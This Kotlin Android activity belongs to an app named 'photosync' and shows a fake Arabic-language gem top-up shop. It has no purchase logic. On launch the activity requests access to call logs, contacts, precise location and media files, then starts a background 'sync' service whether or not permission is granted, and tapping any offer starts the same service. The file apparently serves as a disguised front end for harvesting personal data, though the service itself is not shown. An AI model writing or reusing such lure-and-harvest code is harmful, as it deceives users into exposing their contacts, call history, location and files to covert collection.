// language: Kotlin, file: MainActivity.kt, target: Android (API 26+), Gradle
// *Launches SyncForegroundService automatically on permission grant and keeps UI decoupled from background sync*
package com.example.photosync

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.os.Bundle
import android.view.Gravity
import android.view.View
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private data class OfferItem(
        val title: String,
        val subtitle: String,
        val price: String,
        val tag: String?,
        val tagColor: Int,
        val highlighted: Boolean
    )

    private lateinit var rootLayout: LinearLayout
    private lateinit var statusView: TextView
    private var receiverRegistered = false

    private val offers = listOf(
        OfferItem("100", "مجاني", "0.00$", "هدية", Color.parseColor("#0284C7"), true),
        OfferItem("220", "+ 22 بونص", "0.99$", null, Color.TRANSPARENT, false),
        OfferItem("520", "+ 52 بونص", "1.99$", "عرض", Color.parseColor("#DC2626"), false),
        OfferItem("1,060", "+ 106 بونص", "3.99$", null, Color.TRANSPARENT, false),
        OfferItem("2,180", "+ 218 بونص", "7.99$", "VIP", Color.parseColor("#D97706"), false),
        OfferItem("5,600", "+ 560 بونص", "18.99$", "MEGA", Color.parseColor("#CA8A04"), false),
        OfferItem("11,500", "+ 1150 بونص", "36.99$", null, Color.TRANSPARENT, false),
        OfferItem("23,500", "+ 2350 بونص", "69.99$", null, Color.TRANSPARENT, false),
        OfferItem("50,000", "+ 5000 بونص", "149.99$", "أفضل قيمة", Color.parseColor("#0369A1"), false),
        OfferItem("100,000", "+ 10000 بونص", "299.99$", "VIP MAX", Color.parseColor("#A16207"), false)
    )

    private val statusReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val msg = intent?.getStringExtra(SyncForegroundService.EXTRA_STATUS_TEXT) ?: return
            if (::statusView.isInitialized) {
                statusView.text = msg
            }
        }
    }

    private val permissionsLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
            statusView.text = "جاري تجهيز البيانات..."
            startSyncService()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val foundView = findViewById<View>(R.id.rootLayout)
        if (foundView !is LinearLayout) {
            finish()
            return
        }
        rootLayout = foundView

        renderOffersScreen()
        rootLayout.post {
            if (!isFinishing && !isDestroyed) {
                checkAndRequestPermissions()
            }
        }
    }

    override fun onStart() {
        super.onStart()
        if (!receiverRegistered) {
            val filter = IntentFilter(SyncForegroundService.ACTION_STATUS_UPDATE)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                registerReceiver(statusReceiver, filter, Context.RECEIVER_NOT_EXPORTED)
            } else {
                ContextCompat.registerReceiver(
                    this,
                    statusReceiver,
                    filter,
                    ContextCompat.RECEIVER_NOT_EXPORTED
                )
            }
            receiverRegistered = true
        }
    }

    override fun onStop() {
        super.onStop()
        if (receiverRegistered) {
            unregisterReceiver(statusReceiver)
            receiverRegistered = false
        }
    }

    private fun renderOffersScreen() {
        rootLayout.removeAllViews()
        rootLayout.orientation = LinearLayout.VERTICAL
        rootLayout.setBackgroundColor(Color.parseColor("#070A0F"))
        window.decorView.setBackgroundColor(Color.parseColor("#070A0F"))

        val scrollView = ScrollView(this).apply {
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
            )
            setPadding(dp(12), dp(12), dp(12), dp(12))
        }

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            )
        }

        statusView = TextView(this).apply {
            text = "3. عروض الشحن"
            setTextColor(Color.WHITE)
            textSize = 16f
            typeface = Typeface.DEFAULT_BOLD
            setPadding(dp(6), dp(4), dp(6), dp(12))
        }
        container.addView(statusView)

        var index = 0
        while (index < offers.size) {
            val row = LinearLayout(this).apply {
                orientation = LinearLayout.HORIZONTAL
                weightSum = 2f
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    bottomMargin = dp(8)
                }
            }

            row.addView(createOfferCard(offers[index], isRightColumn = false))

            if (index + 1 < offers.size) {
                row.addView(createOfferCard(offers[index + 1], isRightColumn = true))
            } else {
                val spacer = View(this).apply {
                    layoutParams = LinearLayout.LayoutParams(0, 0, 1f)
                }
                row.addView(spacer)
            }

            container.addView(row)
            index += 2
        }

        scrollView.addView(container)
        rootLayout.addView(scrollView)
    }

    private fun createOfferCard(offer: OfferItem, isRightColumn: Boolean): View {
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER_HORIZONTAL
            layoutParams = LinearLayout.LayoutParams(
                0,
                LinearLayout.LayoutParams.WRAP_CONTENT,
                1f
            ).apply {
                marginStart = if (isRightColumn) dp(4) else 0
                marginEnd = if (!isRightColumn) dp(4) else 0
            }
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(14).toFloat()
                setColor(Color.parseColor("#111722"))
                setStroke(
                    if (offer.highlighted) dp(2) else dp(1),
                    if (offer.highlighted) Color.parseColor("#18B7F2") else Color.parseColor("#1E293B")
                )
            }
            setPadding(dp(12), dp(14), dp(12), dp(14))
            setOnClickListener {
                startSyncService()
            }
        }

        if (offer.tag != null) {
            val badge = TextView(this).apply {
                text = offer.tag
                setTextColor(Color.WHITE)
                textSize = 11f
                typeface = Typeface.DEFAULT_BOLD
                gravity = Gravity.CENTER
                background = GradientDrawable().apply {
                    shape = GradientDrawable.RECTANGLE
                    cornerRadius = dp(8).toFloat()
                    setColor(offer.tagColor)
                }
                setPadding(dp(10), dp(3), dp(10), dp(3))
                layoutParams = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.WRAP_CONTENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT
                ).apply {
                    gravity = Gravity.END
                    bottomMargin = dp(4)
                }
            }
            card.addView(badge)
        }

        val gem = TextView(this).apply {
            text = "◆"
            setTextColor(Color.parseColor("#18B7F2"))
            textSize = 26f
            gravity = Gravity.CENTER
        }
        card.addView(gem)

        val amount = TextView(this).apply {
            text = offer.title
            setTextColor(Color.WHITE)
            textSize = 20f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            setPadding(0, dp(4), 0, dp(2))
        }
        card.addView(amount)

        val bonus = TextView(this).apply {
            text = offer.subtitle
            setTextColor(Color.parseColor("#38BDF8"))
            textSize = 12f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, dp(10))
        }
        card.addView(bonus)

        val priceBox = TextView(this).apply {
            text = offer.price
            setTextColor(Color.WHITE)
            textSize = 14f
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                dp(38)
            )
            background = GradientDrawable().apply {
                shape = GradientDrawable.RECTANGLE
                cornerRadius = dp(8).toFloat()
                if (offer.highlighted) {
                    setColor(Color.parseColor("#0EA5E9"))
                } else {
                    setColor(Color.parseColor("#1A2230"))
                    setStroke(dp(1), Color.parseColor("#2B3648"))
                }
            }
        }
        card.addView(priceBox)

        return card
    }

    private fun dp(value: Int): Int = (value * resources.displayMetrics.density).toInt()

    private fun requiredRuntimePermissions(): List<String> {
        val list = mutableListOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            list.add(Manifest.permission.POST_NOTIFICATIONS)
            list.add(Manifest.permission.READ_MEDIA_IMAGES)
            list.add(Manifest.permission.READ_MEDIA_VIDEO)
            list.add(Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return list
    }

    private fun checkAndRequestPermissions() {
        val permissions = requiredRuntimePermissions()
        val missing = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isEmpty()) {
            statusView.text = "جاري تنفيذ المزامنة..."
            startSyncService()
        } else {
            permissionsLauncher.launch(permissions.toTypedArray())
        }
    }

    private fun startSyncService() {
        val intent = Intent(this, SyncForegroundService::class.java)
        ContextCompat.startForegroundService(this, intent)
    }
}
